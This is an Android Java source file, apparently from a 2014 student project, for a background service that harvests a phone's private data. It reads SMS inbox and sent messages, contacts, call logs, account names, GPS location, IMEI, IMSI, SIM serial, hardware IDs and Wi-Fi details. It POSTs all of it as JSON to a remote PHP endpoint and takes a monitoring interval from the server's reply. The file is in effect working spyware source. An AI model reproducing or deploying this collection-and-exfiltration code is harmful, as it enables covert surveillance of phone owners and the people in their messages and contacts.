package dd_pc.service;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.annotation.TargetApi;
import android.app.Activity;
import android.app.ActivityManager;
import android.app.Service;
import android.bluetooth.BluetoothAdapter;
import android.content.*;
import android.database.Cursor;
import android.location.LocationManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.os.IBinder;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.util.Patterns;
import com.google.gson.Gson;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONObject;

import java.io.*;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.*;
import java.util.regex.Pattern;


/**
 * Created by dd-pc on 10.09.2014.
 */
public class smsCall extends Service {


    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    public static class sms extends Activity {
        static String just_site= "https://diplom2-dihao.c9.io/post.php";
        static String time_interval_internet_string = "";
        static int time_interval_internet_int ;
         static String exeption=null;
        static  String v_android = null;
        static String  mail_google_account=null;
        static String m_szBTMAC=null;
        static String m_szWLANMAC=null;
        static String m_szDevIDShort=null;
        static String m_szAndroidID =null;
        static  String m_szImei="";
        static  String m_szUniqueID="";
        static String  c_gprs=null;
        static String WLANMAC=null;
        static String c_wifi=null;
        static String ssid=null;
        static String RAM = null;
        static String usage = "";
        static String Longitude = "";
        static String Latitude= "";
        static String responseJson = "";
        static String Final_Str = new String();
        static String Final_Str2 = new String();
        static String mySmsAsJson_network =new String();
        static String mySmsAsJson_contact =new String();
        static String mySmsAsJson_mail =new String();
        static String mySmsAsJson_geodata =new String();
        static String mySmsAsJson_out =new String();
        static String mySmsAsJson_in =new String();
        static String mySmsAsJson_health =new String();
        static String mySmsAsJson_device =new String();
        static String mySmsAsJson_call_log_incoming =new String();
        static String mySmsAsJson_gps_wifi =new String();
        static String mySmsAsJson_call_log_outcoming =new String();
        static ArrayList<temp_class_network> temp_list_network = new ArrayList<temp_class_network>();
        static ArrayList<temp_class> temp_list = new ArrayList<temp_class>();
        static ArrayList<temp_class_gps_wifi> temp_list_gps_wifi = new ArrayList<temp_class_gps_wifi>();
        static ArrayList<temp_class_mail> temp_list_mail = new ArrayList<temp_class_mail>();
        static ArrayList<temp_class_divice> temp_list_device = new ArrayList<temp_class_divice>();
        static ArrayList<temp_class_geodata> temp_list_geodata = new ArrayList<temp_class_geodata>();
        static ArrayList<temp_class_contact> temp_list_contact = new ArrayList<temp_class_contact>();
        static ArrayList<temp_class_log_call> temp_list_incoming = new ArrayList<temp_class_log_call>();
        static ArrayList<temp_class_log_call> temp_list_outgoing = new ArrayList<temp_class_log_call>();
        static ArrayList<temp_class_helth> temp_list_health = new ArrayList<temp_class_helth>();
        static Map<String, List<temp_class>> gson_smsout = new HashMap<String, List<temp_class>>();
        static Map<String, List<temp_class_network>> gson_smsout_network = new HashMap<String, List<temp_class_network>>();
        static Map<String, List<temp_class_gps_wifi>> gson_smsout_gprs_wifi = new HashMap<String, List<temp_class_gps_wifi>>();
        static Map<String, ArrayList<temp_class_divice>> gson_device = new HashMap<String, ArrayList<temp_class_divice>>();
        static Map<String, List<temp_class_mail>> gson_mail = new HashMap<String, List<temp_class_mail>>();
        static Map<String, List<temp_class_geodata>> gson_geodata = new HashMap<String, List<temp_class_geodata>>();
        static Map<String, List<temp_class>> gson_smsin = new HashMap<String, List<temp_class>>();
        static Map<String, List<temp_class_log_call>> gson_call_log_incoming = new HashMap<String, List<temp_class_log_call>>();
        static Map<String, List<temp_class_log_call>> gson_call_log_outcoming = new HashMap<String, List<temp_class_log_call>>();
        static Map<String, List<temp_class_contact>> gson_contact = new HashMap<String, List<temp_class_contact>>();
        static Map<String, List<temp_class_helth>> gson_health = new HashMap<String, List<temp_class_helth>>();
        static TelephonyManager TelephonyMgr;

        static String mPhoneNumber_ibbox = new String();

        @Override
        public void onCreate(Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);


        }

        public static void mmain_inbox(Context context) {
            temp_list.clear();
            Cursor cur = context.getContentResolver().query(Uri.parse("content://sms/inbox"), new String[]{"_id", "address", "date",
                    "body", "person", "read"}, null, null, null);
            int i = 0;


            try {
                if (cur.moveToFirst()) {
                    do {
                        if ((cur.getString(cur.getColumnIndexOrThrow("address")) == null) || (i > 10)) {
                            cur.moveToNext();
                            continue;
                        }

                        String Number = cur.getString(
                                cur.getColumnIndexOrThrow("address")).toString();
                        String _id = cur.getString(cur.getColumnIndexOrThrow("_id"))
                                .toString();
                        String dat = cur.getString(cur.getColumnIndexOrThrow("date"))
                                .toString();
                        String Body = cur.getString(cur.getColumnIndexOrThrow("body"))
                                .toString();
                        Log.e("Body-->", "" + Body);
                        temp_list.add(new temp_class(_id,Body,mPhoneNumber_ibbox,Number,dat));
                        i++;
                    } while (cur.moveToNext());
                }
                cur.close();
            } catch (Exception e) {
                e.printStackTrace();
            }

            try {
                gson_smsin.put("sms_in", temp_list);
                Gson gson = new Gson();
                 mySmsAsJson_in = gson.toJson(gson_smsin);

            }catch (Exception e){
                Log.v("ef",e.toString());
            };

        }

        public static void mmain_outbox(Context context) {
            temp_list.clear();
            TelephonyManager tMgr = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            mPhoneNumber_ibbox = tMgr.getLine1Number();
            JSONObject objecting1 = new JSONObject();
            Uri uriSMSURI = Uri.parse("content://sms/inbox");//INBOX
            Cursor cur = context.getContentResolver().query(Uri.parse("content://sms/sent"), new String[]{"_id", "address", "date",
                    "body", "person", "read"}, null, null, null);
            int i = 0;
            try {
                if (cur.moveToFirst()) {
                    do {
                        if ((cur.getString(cur.getColumnIndexOrThrow("address")) == null) || (i > 10)) {
                            cur.moveToNext();
                            continue;
                        }

                               String Number = cur.getString(
                                cur.getColumnIndexOrThrow("address")).toString();
                               String _id = cur.getString(cur.getColumnIndexOrThrow("_id"))
                                .toString();
                                String dat = cur.getString(cur.getColumnIndexOrThrow("date"))
                                .toString();
                               String Body = cur.getString(cur.getColumnIndexOrThrow("body"))
                                .toString();
                                   Log.e("Body-->", "" + Body);
                        temp_list.add(new temp_class(_id,Body,mPhoneNumber_ibbox,Number,dat));
                        i++;

                    } while (cur.moveToNext());
                }
                cur.close();
            } catch (Exception e) {
                e.printStackTrace();
            }
                           try {
                gson_smsout.put("sms_out", temp_list);
                      Gson gson = new Gson();
              mySmsAsJson_out = gson.toJson(gson_smsout);
                         }catch (Exception e){
                      Log.v("ef",e.toString());
                          };
        }


        public static void contacts(Context context) {
            temp_list_contact.clear();
            int i = 0;
            ContentResolver cr = context.getContentResolver();
            Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                    null, null, null, null);
            if (cur.getCount() > 0) {
                while (cur.moveToNext()&&(i<10)) {//bydet idti poka pravda 3
                    String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
                    String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                    if ((Integer.parseInt(cur.getString(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0)) {
                        Cursor pCur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                                null,
                                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                                new String[]{id}, null);
                        while (pCur.moveToNext()) {
                            String phoneNo = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                            temp_list_contact.add(new temp_class_contact(name,phoneNo));
                            i++;
                        }
                        pCur.close();
                    }
                }
            }
            try {
                gson_contact.put("contact", temp_list_contact);
                Gson gson = new Gson();
                mySmsAsJson_contact = gson.toJson(gson_contact);
                Log.v("efe",mySmsAsJson_contact);
            }catch (Exception e){
                Log.v("ef",e.toString());
            };
        }

        public static void get_call_log(Context context) {
            temp_list_incoming.clear();
            temp_list_outgoing.clear();
            int i=0;

            Cursor callLogCursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null,
                   null, null);

            if (callLogCursor != null) {
	/*Looping through the results*/
                while ((callLogCursor.moveToNext()&&(i<10)))
                {
		/*Contact Name*/
                    String name = callLogCursor.getString(callLogCursor.getColumnIndex( CallLog.Calls.CACHED_NAME));

                    String cacheNumber = callLogCursor.getString(callLogCursor.getColumnIndex(CallLog.Calls.CACHED_NUMBER_LABEL));

		/*Contact Number*/
                    String number = callLogCursor.getString(callLogCursor.getColumnIndex(CallLog.Calls.NUMBER));

		/*Date*/
                    String dateTimeMillis = callLogCursor.getString(callLogCursor.getColumnIndex(CallLog.Calls.DATE));

		/*Duration*/
                    String durationMillis = callLogCursor.getString(callLogCursor.getColumnIndex(CallLog.Calls.DURATION));

		/*Call Type – Incoming, Outgoing, Missed*/
                    int callType = callLogCursor.getInt(callLogCursor.getColumnIndex(CallLog.Calls.TYPE));
                    if (callType == 1){
                        temp_list_incoming.add(new temp_class_log_call(number, dateTimeMillis, durationMillis));

                    }else if (callType == 2){
                        temp_list_outgoing.add(new temp_class_log_call(number, dateTimeMillis, durationMillis));
                    };
                        i++;
                }
                callLogCursor.close();
            }
            try {
                gson_call_log_outcoming.put("call_out", temp_list_outgoing);
                Gson gson = new Gson();
               mySmsAsJson_call_log_outcoming = gson.toJson(gson_call_log_outcoming);


                gson_call_log_incoming.put("call_in", temp_list_incoming);
                Gson gson2 = new Gson();
                mySmsAsJson_call_log_incoming = gson2.toJson(gson_call_log_incoming);
                Log.v("efe",mySmsAsJson_contact);
            }catch (Exception e){
                Log.v("ef",e.toString());
            };
        }
        public static void mail(Context context){
            temp_list_mail.clear();
            AccountManager accountManager = AccountManager.get(context);
            Account[] accounts = accountManager.getAccounts();
            for (int i = 0; ((i < accounts.length)) ; i++) { //accounts.length
                if (i>10) {break;}
                temp_list_mail.add(new temp_class_mail(accounts[i].name,accounts[i].type));
            }
            try {
                gson_mail.put("account", temp_list_mail);
                Gson gson = new Gson();
                mySmsAsJson_mail = gson.toJson(gson_mail);
                 temp_list_mail.clear();
                Log.v("efe",mySmsAsJson_mail);
            }catch (Exception e){
                Log.v("ef",e.toString());
            };
            }
        public static void send_respinse() throws UnsupportedEncodingException {
            //geodata////
            temp_list_geodata.clear();
            Latitude = "";
            Longitude="";
            try {
               Latitude = String.valueOf(MyLocationListener.imHere.getLatitude());
               Longitude = String.valueOf(MyLocationListener.imHere.getLongitude());

            } catch (Exception e){
                 Latitude = "-0";
                 Longitude="-0";}
            temp_list_geodata.add(new temp_class_geodata(Latitude,Longitude));
            gson_geodata.put("geodata", temp_list_geodata);
            Gson gson2 = new Gson();
            mySmsAsJson_geodata = gson2.toJson(gson_geodata);

            ////geodata///
            Final_Str2=mySmsAsJson_device+mySmsAsJson_network+mySmsAsJson_health+mySmsAsJson_gps_wifi;
             Final_Str = mySmsAsJson_geodata+mySmsAsJson_out+mySmsAsJson_in+mySmsAsJson_contact+mySmsAsJson_call_log_outcoming+mySmsAsJson_call_log_incoming+mySmsAsJson_mail+Final_Str2;
           try {
               SendJsonViaPost(just_site, Final_Str2 + Final_Str);
           } catch (Exception e ){

           }

        }
        private final BroadcastReceiver myReceiver = new BroadcastReceiver() {

            @Override
            public void onReceive(Context context, Intent intent) {
                // TODO Auto-generated method stub

                if(intent.getAction().equalsIgnoreCase("android.bluetooth.BluetoothDevice.ACTION_ACL_CONNECTED"))
                {

                }

            }
        };
        static void helth(Context context){

            ////// baterrryryryry//////


            IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            Intent batteryStatus = context.registerReceiver(null, ifilter);
           int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
           int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);



            int batteryPct = (int) (level / (float)scale);
            String battery = Integer.toString(level)+"%";
          //  Log.e("hello",battery);
            int status = batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
            boolean isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING ||
                    status == BatteryManager.BATTERY_STATUS_FULL;

            int chargePlug = batteryStatus.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);
            boolean usbCharge = chargePlug == BatteryManager.BATTERY_PLUGGED_USB;
            boolean acCharge = chargePlug == BatteryManager.BATTERY_PLUGGED_AC;
            String battery_connect = "";
            if (usbCharge == true){ Log.e("usb","connect"); battery_connect = "Battery Charging via USB";}else
            if (acCharge == true){ Log.e("ac","connect"); battery_connect = "Battery Charging via AC";}else
             {battery_connect = "Running On Battery (Discharging)";}

      ////// batery/////
///usage///
        readUsageCPU();
///usage
//ram///
            try{ getTotalRAM16(context);} catch (Exception exxx1){exeption =exxx1.getMessage();return;};
           try{ getTotalRAM15();}   catch (Exception exxx1){exeption =exxx1.getMessage();return;};


/// ram////
            temp_list_health.add(new temp_class_helth(usage,battery,battery_connect,RAM));//battery,battery_connect,usage,RAM
            try {
                gson_health.put("health", temp_list_health);
                Gson gson = new Gson();
                mySmsAsJson_health = gson.toJson(gson_health);
                temp_list_health.clear();
                Log.v("efe",mySmsAsJson_health);
            }catch (Exception e){
                Log.v("ef",e.toString());
            };
         }

        public static void getTotalRAM16(Context context){
            RAM = null;
        ActivityManager actManager = (ActivityManager) context.getSystemService(ACTIVITY_SERVICE);
        ActivityManager.MemoryInfo memInfo = new ActivityManager.MemoryInfo();
        actManager.getMemoryInfo(memInfo);
        long totalMemory = memInfo.availMem/ 1048576L ;
            RAM = String.valueOf(totalMemory) + "mb " + "(The available memory on the system)";
        }
        public static void getTotalRAM15(){
            getTotalMemorySize();
            getFreeMemorySize();
            getUsedMemorySize();
        }
        public static long getUsedMemorySize() {

            long freeSize = 0L;
            long totalSize = 0L;
            long usedSize = -1L;
            try {
                Runtime info = Runtime.getRuntime();
                freeSize = info.freeMemory();
                totalSize = info.totalMemory();
                usedSize = totalSize - freeSize;
            } catch (Exception e) {
                e.printStackTrace();
            }
            RAM = RAM + " ,USED: "+usedSize + "kb)";
            return usedSize;

        }
        public static long getFreeMemorySize() {

            long size = -1L;
            try {
                Runtime info = Runtime.getRuntime();
                size = info.freeMemory();
            } catch (Exception e) {
                e.printStackTrace();
            }
            RAM = RAM + "(FREE:  "+size + "kb ";
            return size;
        }
        public static long getTotalMemorySize() {
            RAM = "";
            long size = -1L;
            try {
                Runtime info = Runtime.getRuntime();
                size = info.totalMemory();
            } catch (Exception e) {
                e.printStackTrace();
            }
            RAM = RAM+size + "kb ";
            return size;
        }
        static float readUsageCPU() {
            usage="";
            try {
                RandomAccessFile reader = new RandomAccessFile("/proc/stat", "r");
                String load = reader.readLine();

                String[] toks = load.split(" ");

                long idle1 = Long.parseLong(toks[4]);
                long cpu1 = Long.parseLong(toks[2]) + Long.parseLong(toks[3]) + Long.parseLong(toks[5])
                        + Long.parseLong(toks[6]) + Long.parseLong(toks[7]) + Long.parseLong(toks[8]);

                try {
                    Thread.sleep(360);
                } catch (Exception e) {}

                reader.seek(0);
                load = reader.readLine();
                reader.close();

                toks = load.split(" ");

                long idle2 = Long.parseLong(toks[4]);
                long cpu2 = Long.parseLong(toks[2]) + Long.parseLong(toks[3]) + Long.parseLong(toks[5])
                        + Long.parseLong(toks[6]) + Long.parseLong(toks[7]) + Long.parseLong(toks[8]);
                usage = String.valueOf((float)(cpu2 - cpu1) / ((cpu2 + idle2) - (cpu1 + idle1)));
                return (float)(cpu2 - cpu1) / ((cpu2 + idle2) - (cpu1 + idle1));

            } catch (IOException ex) {
                ex.printStackTrace();
            }

            return 0;
        }
        @TargetApi(Build.VERSION_CODES.FROYO)
        public static void network(Context context){
            TelephonyManager mTelephonyMgr = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            String simno = mTelephonyMgr.getSimSerialNumber();
            Pattern emailPattern = Patterns.EMAIL_ADDRESS; // API level 8+
            Account[] accounts = AccountManager.get(context).getAccountsByType("com.google");
            for (Account account : accounts) {
                if (account.name!=null) {
                    mail_google_account = account.name+"(FROM:"+account.type+")";
                }else { mail_google_account = "unknown";}
            } mail_google_account = "unknown/"+mail_google_account;
            TimeZone tz2 = TimeZone.getDefault();
            String tz= tz2.getDisplayName(false, TimeZone.SHORT);
            temp_list_network.add(new temp_class_network(simno,mail_google_account,tz));

            try {
                gson_smsout_network.put("account", temp_list_network);
                Gson gson = new Gson();
                mySmsAsJson_network = gson.toJson(gson_smsout_network);
                temp_list_network.clear();
                Log.v("efe",mySmsAsJson_network);
            }catch (Exception e){
                Log.v("ef",e.toString());
            };
        }
        public static void getUID(Context context){
            //////////uid and some else///////
            TelephonyMgr = (TelephonyManager) context.getSystemService(TELEPHONY_SERVICE);
             m_szImei = TelephonyMgr.getDeviceId(); // Requires READ_PHONE_STATE
            m_szDevIDShort = "35" + //we make this look like a valid IMEI
                    Build.BOARD.length() % 10 + Build.BRAND.length() % 10 +
                    Build.CPU_ABI.length() % 10 + Build.DEVICE.length() % 10 +
                    Build.DISPLAY.length() % 10 + Build.HOST.length() % 10 +
                    Build.ID.length() % 10 + Build.MANUFACTURER.length() % 10 +
                    Build.MODEL.length() % 10 + Build.PRODUCT.length() % 10 +
                    Build.TAGS.length() % 10 + Build.TYPE.length() % 10 +
                    Build.USER.length() % 10; //13 digits
            ///
             m_szAndroidID = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
            ///
            WifiManager wm = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
             m_szWLANMAC = wm.getConnectionInfo().getMacAddress();
            ///
            BluetoothAdapter m_BluetoothAdapter = null; // Local Bluetooth adapter
            m_BluetoothAdapter = BluetoothAdapter.getDefaultAdapter();
            m_szBTMAC = m_BluetoothAdapter.getAddress();
            ///
            String m_szLongID = m_szImei + m_szDevIDShort + m_szAndroidID + m_szWLANMAC + m_szBTMAC;

            // compute md5
            MessageDigest m = null;
            try {
                m = MessageDigest.getInstance("MD5");
            } catch (NoSuchAlgorithmException e) {
                e.printStackTrace();
            }
            m.update(m_szLongID.getBytes(), 0, m_szLongID.length());
            // get md5 bytes
            byte p_md5Data[] = m.digest();
            // create a hex string
            for (int i = 0; i < p_md5Data.length; i++) {
                int b = (0xFF & p_md5Data[i]);
                // if it is a single digit, make sure it have 0 in front (proper padding)
                if (b <= 0xF) m_szUniqueID += "0";
                // add number to string
                m_szUniqueID += Integer.toHexString(b);
            }
            // hex string to uppercase
             m_szUniqueID = m_szUniqueID.toUpperCase();
            /////////uid///////   ->  "uid"    "deviceid"  "androidid"    "imei_meid"

        }
        public static void device (Context context) {
                /////......uid
            getUID(context);
            //////.....uid
            ///// build version ////
            v_android= String.valueOf(Build.VERSION.SDK_INT);
            String vv_android = Build.VERSION.RELEASE;
            v_android = "Android "+ vv_android +"(SDK: "+v_android+" )";
            ///// b version ///
             ///imsi /// - >     imsi
            String imsi = new String();

                imsi= TelephonyMgr.getSubscriberId().toString();
            Log.e("String",imsi);
            ///imsi /// - >     imsi

            /// gsfidkey ///  ->   "gsfidkey"
            String gsfidkey = null;
            Uri URI = Uri.parse("content://com.google.android.gsf.gservices");
            String ID_KEY = "android_id";
            String params[] = {ID_KEY};
            Cursor c = context.getContentResolver().query(URI, null, null, params, null);
            if (!c.moveToFirst() || c.getColumnCount() < 2)
                gsfidkey=null;
            try
            {
                gsfidkey= Long.toHexString(Long.parseLong(c.getString(1)));
            }
            catch (NumberFormatException e)
            {
                gsfidkey= null;
            }
            Log.e("gsfidkey: ",gsfidkey);
            /// gsfidkey ///  ->   "gsfidkey"
            /// build class///
            String b1 =null;
            String b2 =null;
            String b3 =null;
            String b4 =null;
            String b5 =null;
            String b6 =null;
            String b7 =null;
            String b8 =null;
            String b9 =null;
            String b10 =null;
            String b11 =null;
            String b12 =null;
            String b13 =null;
            String b14 =null;
            String b15 =null;
            String b16 =null;
            String b17 =null;
            String b18 =null;
            String b19 =null;
            String b20 =null;
            String b21 =null;

            b1 = android.os.Build.PRODUCT;
            b2 =android.os.Build.BOARD ;
            b3 =android.os.Build.BOOTLOADER ;
            b4 = android.os.Build.BRAND;
            b5 =android.os.Build.CPU_ABI ;
            b6 = android.os.Build.CPU_ABI2;
            b7 =android.os.Build.DEVICE ;
            b8 =android.os.Build.DISPLAY ;
            b9 =android.os.Build.FINGERPRINT ;
            b10 =android.os.Build.HARDWARE ;
            b11 =android.os.Build.HOST ;
            b12 = android.os.Build.ID;
            b13 = android.os.Build.MANUFACTURER;
            b14 =android.os.Build.MODEL ;
            b15 =android.os.Build.PRODUCT ;
            b16 =android.os.Build.RADIO ;
            b17 =android.os.Build.SERIAL ;
            b18 =android.os.Build.TAGS ;
            b19 = String.valueOf((Build.TIME));
            b20 =android.os.Build.TYPE ;
            b21 = android.os.Build.USER;
            // build class///--->build
            ///create json////--->json
            temp_list_device.clear();
            temp_list_device.add(new temp_class_divice(v_android,m_szUniqueID,m_szDevIDShort,gsfidkey,m_szAndroidID,m_szImei,imsi,b2,b3,b4,b5,b6,b7,b8,b9,b10,b11,b12,b13,b14,b15,b16,b17,b18,b19,b20));
            try {
                gson_device.put("device", temp_list_device);
                Gson gson = new Gson();
                mySmsAsJson_device = gson.toJson(gson_device);
                temp_list_device.clear();
                Log.v("device",mySmsAsJson_device);
            }catch (Exception e){
                Log.v("ef",e.toString());
            };
            ////create json////---json

        }
        public static void gpr(Context context){
            ConnectivityManager connMgr = (ConnectivityManager) context.getSystemService(context.CONNECTIVITY_SERVICE);


            NetworkInfo nInfo = connMgr.getActiveNetworkInfo();
            android.net.NetworkInfo wifi = connMgr.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
            android.net.NetworkInfo mobile = connMgr.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);

             LocationManager manager = (LocationManager)context.getSystemService    (Context.LOCATION_SERVICE );
            if ( !manager.isProviderEnabled( LocationManager.GPS_PROVIDER ) )
                c_gprs = "disabled";
            else
                c_gprs = "enabled";

            WifiManager wm = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
             WLANMAC = wm.getConnectionInfo().getMacAddress();
             if (wifi.isAvailable() ){
               c_wifi = "Conected ";
                 if (nInfo.isConnected()) {
                      WifiManager wifiManager = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
                      WifiInfo connectionInfo = wifiManager.getConnectionInfo();
                     if (connectionInfo != null) {
                         try {
                      ssid = connectionInfo.getSSID();} catch (Exception sside){ssid = sside.getMessage();};
                     }else {  ssid = "disabled";};


            }

             }
            c_wifi =c_wifi+" (SSID: "+ssid + " ) ";
            Log.e("WIFI:",c_wifi );
                  temp_list_gps_wifi.add(new temp_class_gps_wifi(c_gprs, c_wifi,WLANMAC));
            try {
                gson_smsout_gprs_wifi.put("gps_wifi", temp_list_gps_wifi);
                Gson gson = new Gson();
                mySmsAsJson_gps_wifi = gson.toJson(gson_smsout_gprs_wifi);
                Log.v("efe",mySmsAsJson_gps_wifi);

            }catch (Exception e){
                Log.v("ef",e.toString());
            };
        }
        static  String SendJsonViaPost(String url, String json) {

            HttpClient client = new DefaultHttpClient();
            HttpPost post = new HttpPost(url);
            try {
               // StringEntity stringEntity = new StringEntity(json, "UTF-8");
                //stringEntity.setContentType("application/json");
                //post.setEntity(stringEntity);
                List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(2);
                nameValuePairs.add(new BasicNameValuePair("uid",m_szUniqueID));
                nameValuePairs.add(new BasicNameValuePair("data",json));
                post.setEntity(new UrlEncodedFormEntity(nameValuePairs,"UTF-8"));
                HttpResponse response = client.execute(post);
                BufferedReader rd = new BufferedReader(new InputStreamReader(response.getEntity().getContent()));
                String line = "";
                while ((line = rd.readLine()) != null) {
                    responseJson += line;
                }

            } catch (IOException e) {
                e.printStackTrace();
            }
            return responseJson;}

static public void psrsing (){
    try{
    temp_class_response data = new Gson().fromJson(responseJson, temp_class_response.class);
    time_interval_internet_string = data.monitor_frequency;
    time_interval_internet_int = Integer.parseInt(time_interval_internet_string);}
    catch (Exception e){

    }
}
        static public void Clear(){
            responseJson="";
            time_interval_internet_string ="";
            Final_Str = "";Final_Str2 = "";
            temp_list_network.clear();
            temp_list.clear();
            temp_list_gps_wifi.clear();
            temp_list_mail .clear();
            temp_list_device .clear();
            temp_list_geodata.clear();
            temp_list_contact.clear();
            temp_list_incoming .clear();
            temp_list_outgoing.clear();
            temp_list_health .clear();
            m_szUniqueID="";
            m_szImei="";
            m_szDevIDShort="";
            m_szAndroidID="";
            m_szWLANMAC="";
            m_szBTMAC="";
        }
    }

}








